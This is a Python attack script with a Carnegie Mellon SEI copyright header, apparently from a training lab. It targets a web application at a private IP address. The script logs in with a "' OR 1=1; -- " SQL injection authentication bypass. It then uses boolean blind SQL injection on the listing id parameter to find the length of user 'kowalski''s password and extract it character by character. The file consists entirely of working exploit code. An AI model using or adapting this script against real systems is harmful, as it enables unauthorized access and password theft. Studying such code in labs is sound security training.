#!/usr/bin/python3

# Copyright 2022 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import requests

baseUrl = 'http://192.168.1.100/'

with requests.Session() as session:
    print('attempting blind sql injection')
    print('logging in')
    login = session.post( baseUrl + 'login',  data = { 'username':"a' OR 1=1; -- ", 'password':'aaa' } )
    print( login.text )

    print( 'getting length' )

    attackUrl = "http://192.168.1.100/listing?id=1 and substring((select password from user where username = 'kowalski'),{pos:d},1) > '{c}'; -- "
    attackLen = "http://192.168.1.100/listing?id=2 and (select char_length( password ) from user where username = 'kowalski') > {length:d};-- "

    length = 1
    print( attackLen.format( length = length ) )
    while 'listing not found' not in session.get( attackLen.format( length = length ) ).text:
        length = length + 1

    print( 'password len is probably ' + str( length ) )

    p = ''
    charset = "0123456789abcdefABCDEF"

    for i in range( length ):
        j = 0
        while 'listing not found' not in session.get( attackUrl.format( pos = i + 1, c = charset[j] ) ).text:
            j = j + 1
        print( charset[j] )
        

